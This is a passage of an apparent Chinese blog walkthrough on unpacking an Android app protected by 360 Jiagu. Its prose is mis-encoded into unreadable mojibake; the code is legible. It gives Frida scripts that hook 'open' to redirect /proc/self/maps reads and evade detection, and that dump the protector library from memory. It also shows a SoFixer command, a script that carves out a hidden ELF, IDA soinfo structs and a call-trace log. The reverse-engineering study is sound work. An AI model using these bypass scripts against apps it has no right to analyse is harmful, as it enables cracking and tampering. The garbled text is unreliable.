ï¼Œè¿™ä¸ªæ‰“å°å‡ºæ¥çš„æ—¥å¿—å¯ä»¥è¯´éå¸¸æœ‰æ„æ€ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ï¼Œç›¸æ¯” hook open ä¹‹å‰çš„æ—¥å¿—ï¼Œæˆ‘ä»¬æˆåŠŸçš„è®© 360 åŠ å›ºçš„å£³é‡Šæ”¾å‡ºäº† dex ç„¶è€Œè¿™ä¸ªå£³ä¼¼ä¹æ˜¯åˆå‘ç°äº†äº›ä»€ä¹ˆå¼‚å¸¸ï¼Œéšåèµ¶ç´§è®© app é€€å‡ºäº†ï¼Œä½†æ˜¯ç”±äºé€€å‡ºçš„å¤ªè¿‡ä»“ä¿ƒï¼Œå®ƒç”šè‡³è¿˜æ²¡æœ‰æ¥å¾—åŠæŠŠ dex ä»æ–‡ä»¶å¤¹ä¸­åˆ é™¤ ç”¨ 010editor æ‰“å¼€ classes.dex , å‘ç°å‰å‡ ä½å¹¶ä¸æ˜¯ dex çš„é­”æœ¯å¤´ï¼Œè¯´æ˜è¿™ä¸ª dex è¿˜æ²¡æœ‰è¢«è§£å¯†ï¼Œä¸è¿‡ç°åœ¨æˆ‘ä»¬åªéœ€è¦åˆ†æ dex å¦‚ä½•è¢«å£³ä»å†…å­˜ä¸­é‡Šæ”¾å‡ºæ¥çš„è¿‡ç¨‹å°±å¯ä»¥äº†ï½ å¦‚ä½•å¯ä»¥å®šä½åˆ°æ˜¯ä»€ä¹ˆä½ç½®è°ƒç”¨äº† open å‡½æ•°æ¥æ‰“å¼€ classes.dex å‘¢ï¼Ÿ å¾ˆç®€å•ï¼Œæ‰“å°ä¸€ä¸‹å †æ ˆå°±å¯ä»¥äº† å‡å¦‚æˆ‘ä»¬ä½¿ç”¨å¸¸è§„çš„ frida æ‰“å°å †æ ˆä»£ç ï¼Œå³ä½¿ç”¨ DebugSymbol.fromAddress å‡½æ•°æ¥åˆ¤æ–­åœ°å€æ‰€åœ¨çš„ so çš„ä½ç½®ï¼Œé‚£ä¹ˆè¿›ç¨‹æ˜¯ä¼šæŠ¥é”™é€€å‡ºçš„ console.log('RegisterNatives called from:\\\\n' + Thread.backtrace(this.context, Backtracer.FUZZY).map(DebugSymbol.fromAddress).join('\\\\n') + '\\\\n');æ‰€ä»¥è¿™é‡Œ DebugSymbol.fromAddress æ‰€å®ç°çš„é€»è¾‘éœ€è¦è‡ªå·±ç¼–å†™ï¼Œå³ä¸‹æ–¹çš„ addr_in_so å‡½æ•° function addr_in_so(addr)&#123; var process_Obj_Module_Arr = Process.enumerateModules(); for(var i = 0; i &lt; process_Obj_Module_Arr.length; i++) &#123; if(addr>process_Obj_Module_Arr[i].base &amp;&amp; addr&lt;process_Obj_Module_Arr[i].base.add(process_Obj_Module_Arr[i].size))&#123; console.log(addr.toString(16),\"is in\",process_Obj_Module_Arr[i].name,\"offset: 0x\"+(addr-process_Obj_Module_Arr[i].base).toString(16)); &#125; &#125;&#125;function hook_proc_self_maps() &#123; const openPtr = Module.getExportByName(null, 'open'); const open = new NativeFunction(openPtr, 'int', ['pointer', 'int']); var fakePath = \"/data/data/com.oacia.apk_protect/maps_nonexistent\"; Interceptor.replace(openPtr, new NativeCallback(function (pathnameptr, flag) &#123; var pathname = Memory.readUtf8String(pathnameptr); console.log(\"open\",pathname);//,Process.getCurrentThreadId() if (pathname.indexOf(\"maps\") >= 0) &#123; console.log(\"find\",pathname+\", redirect to\",fakePath); var filename = Memory.allocUtf8String(fakePath); return open(filename, flag); &#125; if (pathname.indexOf(\"dex\") >= 0) &#123; Thread.backtrace(this.context, Backtracer.FUZZY).map(addr_in_so); &#125; var fd = open(pathnameptr, flag); return fd; &#125;, 'int', ['pointer', 'int']));&#125;function my_hook_dlopen(soName='') &#123; Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), &#123; onEnter: function (args) &#123; var pathptr = args[0]; if (pathptr !== undefined &amp;&amp; pathptr != null) &#123; var path = ptr(pathptr).readCString(); //console.log(path); if (path.indexOf(soName) >= 0) &#123; this.is_can_hook = true; &#125; &#125; &#125;, onLeave: function (retval) &#123; if (this.is_can_hook) &#123; hook_proc_self_maps(); &#125; &#125; &#125; );&#125;setImmediate(my_hook_dlopen,'libjiagu');äºæ˜¯æˆ‘ä»¬å¾—åˆ°äº†é‡Šæ”¾ä¸‰ä¸ª dex æ–‡ä»¶çš„å †æ ˆå›æº¯ classes.dex classes2.dex classes3.dex è¿™é‡Œæˆ‘ä»¬å‘ç° classes.dex ä¸ classes2.dex çš„å †æ ˆå›æº¯å®Œå…¨ç›¸åŒï¼Œå¹¶ä¸” classes3.dex çš„å‰åŠéƒ¨åˆ†å’Œå‰ä¸¤ä¸ª dex çš„å †æ ˆä¸€æ ·ï¼Œéšåè¿›ç¨‹ä¾¿åˆé€€å‡ºäº† é€šè¿‡å¯¹å †æ ˆçš„åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ä¸‰ä¸ª dex åº”è¯¥æ˜¯åœ¨ä¸€ä¸ªå¾ªç¯ä¸­è¢«ä¾æ¬¡åŠ è½½çš„ æ¥ä¸‹æ¥æˆ‘ä»¬ä¾¿è·³è½¬åˆ°å †æ ˆæ‰€æ‰“å°çš„åç§»æ¥è¿›ä¸€æ­¥åˆ†æä¸‹ ç„¶è€Œå½“æˆ‘ä»¬è·³è½¬åˆ°å †æ ˆå›æº¯ä¸­çš„ libjiagu_64.so çš„åç§» 0x19b780 æˆ–è€… 0x134598 æ—¶ï¼Œå´å‘ç°è¿™äº›åœ°å€çš„å€¼éƒ½æ˜¯ 0 æˆ‘ä»¬å¾ˆå¿«å°±èƒ½æƒ³åˆ°è¿™é‡Œç”¨åˆ°çš„æŠ€æœ¯åº”è¯¥æ˜¯å…ˆå°†ä¸€å—å†…å­˜æ ‡è®°ä¸ºå¯å†™å¯æ‰§è¡Œï¼Œéšåå°†å­—èŠ‚ç å¡«å……è¿›å»ï¼Œæ‰€ä»¥è¯´ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨å£³æ‰“å¼€ dex æ—¶ï¼Œå°†æ­¤æ—¶çš„ libjiagu_64.so ä»å†…å­˜ä¸­ dump ä¸‹æ¥å°±å¯ä»¥äº† function dump_so(so_name) &#123; var libso = Process.getModuleByName(so_name); console.log(\"[name]:\", libso.name); console.log(\"[base]:\", libso.base); console.log(\"[size]:\", ptr(libso.size)); console.log(\"[path]:\", libso.path); var file_path = \"/data/data/com.oacia.apk_protect/\" + libso.name + \"_\" + libso.base + \"_\" + ptr(libso.size) + \".so\"; var file_handle = new File(file_path, \"wb\"); if (file_handle &amp;&amp; file_handle != null) &#123; Memory.protect(ptr(libso.base), libso.size, 'rwx'); var libso_buffer = ptr(libso.base).readByteArray(libso.size); file_handle.write(libso_buffer); file_handle.flush(); file_handle.close(); console.log(\"[dump]:\", file_path); &#125;&#125;var dump_once = false;// å› ä¸ºä¼šæ‰“å¼€ä¸‰æ¬¡ dex, æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä»… dump æ‰“å¼€ç¬¬ä¸€æ¬¡ dex æ—¶çš„ libjiagu_64.sofunction hook_proc_self_maps() &#123; const openPtr = Module.getExportByName(null, 'open'); const open = new NativeFunction(openPtr, 'int', ['pointer', 'int']); var fakePath = \"/data/data/com.oacia.apk_protect/maps_nonexistent\"; Interceptor.replace(openPtr, new NativeCallback(function (pathnameptr, flag) &#123; var pathname = Memory.readUtf8String(pathnameptr); console.log(\"open\",pathname);//,Process.getCurrentThreadId() if (pathname.indexOf(\"maps\") >= 0) &#123; console.log(\"find\",pathname+\", redirect to\",fakePath); var filename = Memory.allocUtf8String(fakePath); return open(filename, flag); &#125; if (pathname.indexOf(\"dex\") >= 0) &#123; if(!dump_once)&#123; dump_once = true; dump_so(\"libjiagu_64.so\"); &#125; &#125; var fd = open(pathnameptr, flag); return fd; &#125;, 'int', ['pointer', 'int']));&#125;ç„¶åå†å»ç”¨ SoFixer ä¿®å¤è¿™ä¸ª dump ä¸‹æ¥çš„ so .\\SoFixer-Windows-64.exe -s .\\libjiagu_64.so_0x7a69829000_0x274000_open_classes.dex.so -o .\\libjiagu_64.so_0x7a69829000_0x274000_open_classes.dex_fix.so -m 0x7a69829000 -då†æ¬¡æ¥åˆ°åç§» 0x19B780 å¤„ï¼Œå¯ä»¥å‘ç°è¿™å—ç©ºå†…å­˜å·²ç»è¢«å¡«å……äº†æ•°æ® æ¥ä¸‹æ¥æˆ‘ä»¬æƒ³çŸ¥é“çš„æ˜¯ç©¶ç«Ÿæ˜¯ä»ä»€ä¹ˆåœ°æ–¹å¼€å§‹è¢«å¡«å……äº†æ–°çš„æ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨ WinMerge æ¥è®©å¡«å……å’Œæœªå¡«å……æ•°æ®çš„ so è¿›è¡Œæ¯”è¾ƒçœ‹çœ‹ï¼Œç»“æœå´æœ‰äº†æƒŠäººçš„å‘ç°ï¼Œè¢«å¡«å……çš„æ•°æ®æ˜¯ä» 0xe7000 å¼€å§‹çš„ï¼Œå®ƒçš„å¼€å¤´ç«Ÿç„¶æ˜¯ ELF æ–‡ä»¶çš„é­”æ•°å¤´ï¼ï¼Ÿè¿™æœ‰æ„æ€äº†ï¼Œé‚£ä¹ˆå°±æ˜¯ä¸€ä¸ª so é‡Œé¢è—äº†å¦å¤–ä¸€ä¸ª so å’¯ï½ æˆ‘ä»¬å†™ä¸ª python è„šæœ¬ï¼ŒæŠŠè¿™ä¸ª ELF ä» 0x0e7000 å¼€å§‹åé¢çš„æ‰€æœ‰å­—èŠ‚éƒ½å¤åˆ¶åˆ°æ–°çš„æ–‡ä»¶é‡Œé¢ with open('libjiagu_64.so_0x7a69829000_0x274000_open_classes.dex.so','rb') as f: s=f.read()with open('libjiagu_0xe7000.so','wb') as f: f.write(s[0xe7000::])ä½†æ˜¯å½“æŠŠè¿™ä¸ª elf æå–å‡ºæ¥ä¹‹åæ‹¿ 010editor çœ‹å´å‘ç° program header table è¢«åŠ å¯†äº† è¿™å°±å¯¼è‡´ ida æ ¹æœ¬å°±æ— æ³•è¿›è¡Œæ­£å¸¸çš„åˆ†æ # ä¸» ELF è§£å¯†æµç¨‹åˆ†æ å£³ elf åŠ è½½ä¸» elf, å¹¶ä¸” program header è¿˜è¢«åŠ å¯†äº†ï¼Œæ„Ÿè§‰è¿™ç§å½¢å¼å¾ˆåƒæ˜¯ è‡ªå®ç° linker åŠ å›º so å¯¹äºè¿™ç§åŠ å›ºæ–¹å¼ï¼Œå£³ elf åœ¨ä»£ç ä¸­è‡ªå·±å®ç°äº†è§£æ ELF æ–‡ä»¶çš„å‡½æ•°ï¼Œå¹¶å°†è§£æç»“æœèµ‹å€¼åˆ° soinfo ç»“æ„ä½“ä¸­ï¼Œéšåè°ƒç”¨ dlopen è¿›è¡Œæ‰‹åŠ¨åŠ è½½ æ¥åˆ° ida é‡Œé¢åœ¨å¯¼å…¥è¡¨å¯¹ dlopen è¿›è¡Œäº¤å‰å¼•ç”¨ï¼Œæˆ‘ä»¬çœ‹åˆ° dlopen æœ‰ 5 ä¸ªäº¤å‰å¼•ç”¨ çœ‹åˆ°ç¬¬äºŒä¸ªäº¤å‰å¼•ç”¨ï¼Œæ¥åˆ° sub_3C94 å‡½æ•°ï¼Œè¿™ä¸ª for å¾ªç¯çœ‹èµ·æ¥åƒæ˜¯åœ¨ç”¨ç¬¦å·è¡¨é€šè¿‡ dlopen åŠ è½½ä¾èµ–é¡¹ å‘ä¸Šé¢ç¿»ç¿»ä»£ç ï¼Œçœ‹åˆ°è¿™ä¸ª switch å°±çŸ¥é“æ‰¾å¯¹åœ°æ–¹äº†ï¼Œè¿™é‡Œåº”è¯¥å°±æ˜¯è‡ªå®ç° linker æ¥åŠ è½½ so çš„ å› ä¸ºè¿™å’Œ AOSP æºç  ( android-platform\\bionic\\linker\\linker.cpp ) ä¸­çš„é¢„é“¾æ¥ ( soinfo::prelink_image ) è¿™éƒ¨åˆ†çš„æ“ä½œæä¸ºçš„ç›¸ä¼¼ é‚£æ¥ä¸‹æ¥å°±åœ¨ ida ä¸­å¯¼å…¥ soinfo ç›¸å…³çš„ç¬¦å·å°±å¯ä»¥å•¦ åœ¨ ida ä¸­ä¾æ¬¡ç‚¹å‡» View-&gt;Open subviews-&gt;Local Types , ç„¶åæŒ‰ä¸‹é”®ç›˜ä¸Šçš„ Insert å°†ä¸‹é¢çš„ç»“æ„ä½“æ·»åŠ åˆ°å¯¹è¯æ¡†ä¸­ //IMPORTANT//ELF64 å¯ç”¨è¯¥å®#define __LP64__ 1//ELF32 å¯ç”¨è¯¥å®//#define __work_around_b_24465209__ 1/*//https://android.googlesource.com/platform/bionic/+/master/linker/Android.bpæ¶æ„ä¸º 32 ä½ å®šä¹‰__work_around_b_24465209__å®arch: &#123; arm: &#123;cflags: [\"-D__work_around_b_24465209__\"],&#125;, x86: &#123;cflags: [\"-D__work_around_b_24465209__\"],&#125;, &#125;*///android-platform\\bionic\\libc\\include\\link.h#if defined(__LP64__)#define ElfW(type) Elf64_ ## type#else#define ElfW(type) Elf32_ ## type#endif//android-platform\\bionic\\linker\\linker_common_types.h// Android uses RELA for LP64.#if defined(__LP64__)#define USE_RELA 1#endif//android-platform\\bionic\\libc\\kernel\\uapi\\asm-generic\\int-ll64.h//__signed__-->signedtypedef signed char __s8;typedef unsigned char __u8;typedef signed short __s16;typedef unsigned short __u16;typedef signed int __s32;typedef unsigned int __u32;typedef signed long long __s64;typedef unsigned long long __u64;//A12-src\\msm-google\\include\\uapi\\linux\\elf.h/* 32-bit ELF base types. */typedef __u32 Elf32_Addr;typedef __u16 Elf32_Half;typedef __u32 Elf32_Off;typedef __s32 Elf32_Sword;typedef __u32 Elf32_Word;/* 64-bit ELF base types. */typedef __u64 Elf64_Addr;typedef __u16 Elf64_Half;typedef __s16 Elf64_SHalf;typedef __u64 Elf64_Off;typedef __s32 Elf64_Sword;typedef __u32 Elf64_Word;typedef __u64 Elf64_Xword;typedef __s64 Elf64_Sxword;typedef struct dynamic&#123; Elf32_Sword d_tag; union&#123; Elf32_Sword d_val; Elf32_Addr d_ptr; &#125; d_un;&#125; Elf32_Dyn;typedef struct &#123; Elf64_Sxword d_tag; /* entry tag value */ union &#123; Elf64_Xword d_val; Elf64_Addr d_ptr; &#125; d_un;&#125; Elf64_Dyn;typedef struct elf32_rel &#123; Elf32_Addr r_offset; Elf32_Word r_info;&#125; Elf32_Rel;typedef struct elf64_rel &#123; Elf64_Addr r_offset; /* Location at which to apply the action */ Elf64_Xword r_info; /* index and type of relocation */&#125; Elf64_Rel;typedef struct elf32_rela&#123; Elf32_Addr r_offset; Elf32_Word r_info; Elf32_Sword r_addend;&#125; Elf32_Rela;typedef struct elf64_rela &#123; Elf64_Addr r_offset; /* Location at which to apply the action */ Elf64_Xword r_info; /* index and type of relocation */ Elf64_Sxword r_addend; /* Constant addend used to compute value */&#125; Elf64_Rela;typedef struct elf32_sym&#123; Elf32_Word st_name; Elf32_Addr st_value; Elf32_Word st_size; unsigned char st_info; unsigned char st_other; Elf32_Half st_shndx;&#125; Elf32_Sym;typedef struct elf64_sym &#123; Elf64_Word st_name; /* Symbol name, index in string tbl */ unsigned char st_info; /* Type and binding attributes */ unsigned char st_other; /* No defined meaning, 0 */ Elf64_Half st_shndx; /* Associated section index */ Elf64_Addr st_value; /* Value of the symbol */ Elf64_Xword st_size; /* Associated symbol size */&#125; Elf64_Sym;#define EI_NIDENT 16typedef struct elf32_hdr&#123; unsigned char e_ident[EI_NIDENT]; Elf32_Half e_type; Elf32_Half e_machine; Elf32_Word e_version; Elf32_Addr e_entry; /* Entry point */ Elf32_Off e_phoff; Elf32_Off e_shoff; Elf32_Word e_flags; Elf32_Half e_ehsize; Elf32_Half e_phentsize; Elf32_Half e_phnum; Elf32_Half e_shentsize; Elf32_Half e_shnum; Elf32_Half e_shstrndx;&#125; Elf32_Ehdr;typedef struct elf64_hdr &#123; unsigned char e_ident[EI_NIDENT]; /* ELF \"magic number\" */ Elf64_Half e_type; Elf64_Half e_machine; Elf64_Word e_version; Elf64_Addr e_entry; /* Entry point virtual address */ Elf64_Off e_phoff; /* Program header table file offset */ Elf64_Off e_shoff; /* Section header table file offset */ Elf64_Word e_flags; Elf64_Half e_ehsize; Elf64_Half e_phentsize; Elf64_Half e_phnum; Elf64_Half e_shentsize; Elf64_Half e_shnum; Elf64_Half e_shstrndx;&#125; Elf64_Ehdr;/* These constants define the permissions on sections in the program header, p_flags. */#define PF_R 0x4#define PF_W 0x2#define PF_X 0x1typedef struct elf32_phdr&#123; Elf32_Word p_type; Elf32_Off p_offset; Elf32_Addr p_vaddr; Elf32_Addr p_paddr; Elf32_Word p_filesz; Elf32_Word p_memsz; Elf32_Word p_flags; Elf32_Word p_align;&#125; Elf32_Phdr;typedef struct elf64_phdr &#123; Elf64_Word p_type; Elf64_Word p_flags; Elf64_Off p_offset; /* Segment file offset */ Elf64_Addr p_vaddr; /* Segment virtual address */ Elf64_Addr p_paddr; /* Segment physical address */ Elf64_Xword p_filesz; /* Segment size in file */ Elf64_Xword p_memsz; /* Segment size in memory */ Elf64_Xword p_align; /* Segment alignment, file &amp; memory */&#125; Elf64_Phdr;typedef struct elf32_shdr &#123; Elf32_Word sh_name; Elf32_Word sh_type; Elf32_Word sh_flags; Elf32_Addr sh_addr; Elf32_Off sh_offset; Elf32_Word sh_size; Elf32_Word sh_link; Elf32_Word sh_info; Elf32_Word sh_addralign; Elf32_Word sh_entsize;&#125; Elf32_Shdr;typedef struct elf64_shdr &#123; Elf64_Word sh_name; /* Section name, index in string tbl */ Elf64_Word sh_type; /* Type of section */ Elf64_Xword sh_flags; /* Miscellaneous section attributes */ Elf64_Addr sh_addr; /* Section virtual addr at execution */ Elf64_Off sh_offset; /* Section file offset */ Elf64_Xword sh_size; /* Size of section in bytes */ Elf64_Word sh_link; /* Index of another section */ Elf64_Word sh_info; /* Additional section information */ Elf64_Xword sh_addralign; /* Section alignment */ Elf64_Xword sh_entsize; /* Entry size if section holds table */&#125; Elf64_Shdr;//android-platform\\bionic\\linker\\linker_soinfo.htypedef void (*linker_dtor_function_t)();typedef void (*linker_ctor_function_t)(int, char**, char**);#if defined(__work_around_b_24465209__)#define SOINFO_NAME_LEN 128#endifstruct soinfo &#123;#if defined(__work_around_b_24465209__) char old_name_[SOINFO_NAME_LEN];#endif const ElfW(Phdr)* phdr; size_t phnum;#if defined(__work_around_b_24465209__) ElfW(Addr) unused0; // DO NOT USE, maintained for compatibility.#endif ElfW(Addr) base; size_t size;#if defined(__work_around_b_24465209__) uint32_t unused1; // DO NOT USE, maintained for compatibility.#endif ElfW(Dyn)* dynamic;#if defined(__work_around_b_24465209__) uint32_t unused2; // DO NOT USE, maintained for compatibility uint32_t unused3; // DO NOT USE, maintained for compatibility#endif soinfo* next; uint32_t flags_; const char* strtab_; ElfW(Sym)* symtab_; size_t nbucket_; size_t nchain_; uint32_t* bucket_; uint32_t* chain_;#if !defined(__LP64__) ElfW(Addr)** unused4; // DO NOT USE, maintained for compatibility#endif#if defined(USE_RELA) ElfW(Rela)* plt_rela_; size_t plt_rela_count_; ElfW(Rela)* rela_; size_t rela_count_;#else ElfW(Rel)* plt_rel_; size_t plt_rel_count_; ElfW(Rel)* rel_; size_t rel_count_;#endif linker_ctor_function_t* preinit_array_; size_t preinit_array_count_; linker_ctor_function_t* init_array_; size_t init_array_count_; linker_dtor_function_t* fini_array_; size_t fini_array_count_; linker_ctor_function_t init_func_; linker_dtor_function_t fini_func_;/*#if defined (__arm__) // ARM EABI section used for stack unwinding. uint32_t* ARM_exidx; size_t ARM_exidx_count;#endif size_t ref_count_;// æ€ä¹ˆæ‰¾ä¸ link_map è¿™ä¸ªç±»å‹çš„å£°æ˜... link_map link_map_head; bool constructors_called; // When you read a virtual address from the ELF file, add this //value to get the corresponding address in the process' address space. ElfW (Addr) load_bias;#if !defined (__LP64__) bool has_text_relocations;#endif bool has_DT_SYMBOLIC;*/&#125;;å¯¼å…¥å®ŒæˆåæŒ‰ä¸‹ Y é”®ï¼Œå°† a1 å®šä¹‰ä¸º soinfo* ç„¶åå°±å¯ä»¥çœ‹åˆ°è¿™äº›ç¬¦å·äº†ï¼Œä½†æ˜¯çœ‹è¿™äº›ç¬¦å·æ€»æ„Ÿè§‰æœ‰äº›ä¸å¤ªå¯¹åŠ²ï¼Œè¿™é‡Œä¸åº”è¯¥å‡ºç° a1[1] æˆ–è€… a1[2] , æ‰€ä»¥æˆ‘çŒœæµ‹è¿™ä¸ª soinfo æœ‰è¢«é­”æ”¹çš„ç—•è¿¹ è™½ç„¶è¿™ä¸ª soinfo å¯èƒ½æœ‰è¢«é­”æ”¹äº†ï¼Œæˆ‘ä»¬è¿˜æ˜¯ä» sub_3C94 è¿™ä¸ªé¢„é“¾æ¥ç›¸å…³å‡½æ•°å…¥æ‰‹å¥½äº†ï¼Œäº¤å‰å¼•ç”¨å‘ç° sub_3C94 æ˜¯è¢« sub_49F0 è°ƒç”¨ éšåæˆ‘ä»¬æ¥åˆ° sub_49F0 å†…è°ƒç”¨ sub_3C94 å‡½æ•°çš„ä½ç½®ï¼Œå‘ä¸‹çœ‹ï¼Œè¿›å…¥ sub_4918 å‡½æ•°ä¸­ sub_4918 ä¸­è°ƒç”¨äº† sub_5E6C , æˆ‘ä»¬è¿›å…¥ sub_5E6C è¿™ä¸ªå‡½æ•°ä¸­å‡ºç°äº† 0x38 è¿™ä¸ªæ•°å­—ï¼Œ 0x38 æ˜¯è¿™ä¸ªå¾ªç¯çš„æ­¥é•¿ 0x38 è¿™ä¸ªæ•°å­—æœ‰ä»€ä¹ˆç‰¹æ®Šçš„å«ä¹‰å—ï¼Ÿå½“ç„¶æœ‰äº†ï¼ï¼ æˆ‘ä»¬æŠŠåˆšåˆšæå–å‡ºæ¥çš„ elf ç”¨ 010editor æ‰“å¼€ï¼Œçœ‹åˆ° elf_header çš„ phentsize è¿™ä¸ªå­—æ®µï¼Œè¿™ä¸ªå­—æ®µçš„å«ä¹‰æ˜¯ä¸€ä¸ª Program header table çš„é•¿åº¦ï¼Œå®ƒæ­£æ­£å¥½å¥½ä¹Ÿæ˜¯ 0x38 æ‰€ä»¥è¯´åœ¨ sub_5E6C ä¸­å˜é‡ v5 çš„ç±»å‹åº”è¯¥æ˜¯ Elf64_Phdr * , æˆ‘ä»¬ç›´æ¥é‡å®šä¹‰ç±»å‹ æ—¢ç„¶çŸ¥é“äº†çœŸæ­£çš„ program header table å°±æ˜¯åœ¨è¿™ä¸ªä½ç½®çš„ï¼Œé‚£æˆ‘ä»¬ç›´æ¥åœ¨è¿™ä¸ªåœ°æ–¹æŠŠ program header table æ•´ä¸ªç»™ dump ä¸‹æ¥ä¸å°±è¡Œäº† æ‰€ä»¥æˆ‘ä»¬ç›´æ¥å» hook sub_5E6C çš„ä¸‰ä¸ªä¼ å…¥çš„å€¼ function hook_5E6C()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x5E6C), &#123; // fd, buff, len onEnter: function (args) &#123; console.log(hexdump(args[0], &#123; offset: 0,// ç›¸å¯¹åç§» length: 0x38*0x6+0x20,//dump çš„å¤§å° header: true, ansi: true &#125;)); console.log(args[1]) console.log(args[2]) console.log(`base = $&#123;module.base&#125;`) &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125; ä¸Šé¢çš„ç¬¬ä¸€ä¸ª hexdump å°±æ˜¯ program header table , æˆ‘ä»¬å¯ä»¥ç”¨ cyberchef å°† hexdump è½¬æˆæ•°ç»„çš„å½¢å¼ 0x6 åˆ™å¯¹åº”ç€ phnum , è¿™è¡¨ç¤ºå…±æœ‰ 6 ä¸ª program header table 0x793ca38000 è¡¨ç¤ºè¿™ä¸ªä¸» ELF çš„åŸºå€ï¼Œå› ä¸ºè¿™ä¸ªä¸» ELF çš„ä½ç½®åœ¨å£³ ELF åŸºå€çš„åç§» 0xe7000 å¤„ï¼Œè€Œæœ€ä¸‹é¢è¿™è¡Œä¹Ÿå·²ç»æ‰“å°å‡ºäº†å£³ ELF çš„åŸºå€ä¸º 0x793c951000 , 0x793ca38000==0x793c951000+0xe7000 ç­‰å¼æˆç«‹ è‡³æ­¤ä¸ºæ­¢ï¼Œæˆ‘ä»¬æ‹¿åˆ°äº†è§£å¯†ä¹‹åçš„ program header table , åŒæ—¶æˆ‘ä»¬ä¹ŸçŸ¥é“äº† sub_5E6C ä¼ å…¥çš„ä¸‰ä¸ªå‚æ•°åˆ†åˆ«æ˜¯ phdr , phnum ä»¥åŠ base ä½†æ˜¯ phdr æˆå‘˜å‘½åæ˜¯åœ¨ soinfo åç§»çš„ 0x0 çš„ä½ç½® é‚£å‡å¦‚ a1 çš„ç±»å‹å°±æ˜¯ soinfo* , ä¸ºä»€ä¹ˆåœ¨ sub_4918 é‡Œé¢è°ƒç”¨ sub_5E6C ä¼ å…¥çš„æ˜¯åç§»æ˜¯ 232 å‘¢ï¼Ÿ æ‰€ä»¥ soinfo* å¿…å®šæœ‰è¢«é­”æ”¹ï¼ŒåŒæ—¶æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨ soinfo å‰å¡«å……ä¸€ä¸ªå¤§å°ä¸º 232 çš„ char ç±»å‹æ•°ç»„çœ‹çœ‹æ˜¯ä»€ä¹ˆæƒ…å†µ å¾ˆå¥½ï¼Œè¿™éªŒè¯äº†æˆ‘ä»¬å¯¹äº soinfo* è¢«é­”æ”¹çš„çŒœæµ‹ï¼Œå› ä¸ºåœ¨ä¸€åˆ‡æ­£å¸¸çš„æƒ…å†µä¹‹ä¸‹ï¼Œå‡½æ•°çš„è°ƒç”¨åº”è¯¥æ˜¯ sub_5E6C(a1-&gt;phdr, a1-&gt;phnum, a1-&gt;base) æ‰å¯¹ ä½†æ˜¯æˆ‘å¾ˆæƒ³çŸ¥é“è¿™ä¸ªå£³ ELF ç©¶ç«Ÿæ˜¯å¦‚ä½•è¢«è§£å¯†å‡ºæ¥çš„ï¼Œé‚£ä¹ˆé¦–å…ˆæ¥çœ‹çœ‹ä¸» ELF çš„å‡½æ•°è°ƒç”¨é“¾æ˜¯ä»€ä¹ˆæ ·å­çš„å§ï½ æˆ‘å†™äº†ä¸€ä¸ª ida æ’ä»¶æ¥å®ç°è¿™ä¸ªè¿‡ç¨‹ stalker_trace_so åœ¨ IDA ä¸­ä½¿ç”¨ Edit-&gt;Plugins-&gt;stalker_trace_so åï¼Œåœ¨ so æ‰€åœ¨çš„ç›®å½•ä¸‹ä¼šç”Ÿæˆä¸€ä¸ª js è„šæœ¬ï¼Œæˆ‘ä»¬ç”¨ frida æ³¨å…¥åˆ° apk ä¸­å³å¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ so_name éœ€è¦æ”¹æˆ libjiagu_64.so æ‰“å°å‡ºæ¥çš„å®Œæ•´æ—¥å¿—å¦‚ä¸‹ call1:JNI_OnLoadcall2:j_interpreter_wrap_int64_tcall3:interpreter_wrap_int64_t call4:getenvcall5:sub_13908call6:inotify_add_watchcall7:sub_11220call8:fopencall9:sub_9DD8call10:sub_E3E0call11:strtolcall12:feofcall13:raisecall14:memsetcall15:sub_C918call16:sub_9988call17:sub_9964call18:sub_9AC4call19:j_ffi_prep_cifcall20:ffi_prep_cifcall21:j_ffi_prep_cif_machdepcall22:ffi_prep_cif_machdepcall23:j_ffi_callcall24:ffi_callcall25:sub_1674Ccall26:j_ffi_call_SYSVcall27:ffi_call_SYSVcall28:sub_167BCcall29:sub_1647Ccall30:sub_163DCcall31:sub_9900call32:sub_94BCcall33:inotify_initcall34:fmodcall35:strncpycall36:_Z9__arm_a_1P7_JavaVMP7_JNIEnvPvRicall37:sub_9E58call38:sub_999Ccall39:sub_10964call40:j_lseek_1call41:lseekcall42:sub_96E0call43:sub_8000call44:dlopencall45:sub_60E0call46:sub_6544call47:sub_4B54call48:sub_6128call49:_ZN9__arm_c_19__arm_c_0Evcall50:sub_A3ECcall51:sub_99CCcall52:sub_9944call53:sub_6484call54:sub_6590call55:prctlcall56:sub_6698call57:sub_9FFCcall58:j_lseek_3call59:j_lseek_2call60:j_lseek_0call61:sub_9A90call62:sub_5F20call63:sub_6044call64:sub_3574call65:uncompresscall66:sub_49F0call67:sub_5400call68:sub_5478call69:sub_5B08call70:sub_5650call71:sub_580Ccall72:opencall73:atoicall74:sub_3C94call75:strncmpcall76:sub_4918call77:sub_4000call78:sub_41B4call79:sub_35ACcall80:sigactioncall81:sub_5E6Ccall82:sub_5444call83:sub_633Ccall84:sub_8130call85:sub_4C70call86:sub_825Ccall87:sub_8B50call88:sub_8ED4call89:sub_8430call90:interpreter_wrap_int64_t_bridgecall91:sub_9D60call92:sub_166C4call93:memcpycall94:_Z9__arm_a_2PcmS_Riicall95:j_ffi_prep_cif_varcall96:ffi_prep_cif_varæˆ‘ä»¬ä»¥ sub_3C94 ä¸ºèµ·ç‚¹å¼€å§‹åˆ†æï¼Œå› ä¸ºè¿™æ˜¯æˆ‘ä»¬é€šè¿‡ dlopen äº¤å‰å¼•ç”¨æ‰¾åˆ°çš„è‡ªå®ç° linker åŠ å›º so çš„ä¸€ä¸ªåŠŸèƒ½å‡½æ•° å¯¹ sub_3C94 ä¸æ–­æŒ‰ä¸‹ X æŸ¥çœ‹äº¤å‰å¼•ç”¨ï¼Œå¾—åˆ°å¦‚ä¸‹çš„è°ƒç”¨å…³ç³» sub_4B54-&gt;sub_49F0-&gt;sub_3C94 sub_4B54 å¯èƒ½è¢« sub_8000 æˆ– sub_8C74 è°ƒç”¨ æˆ‘ä»¬å°† stalker_trace_so 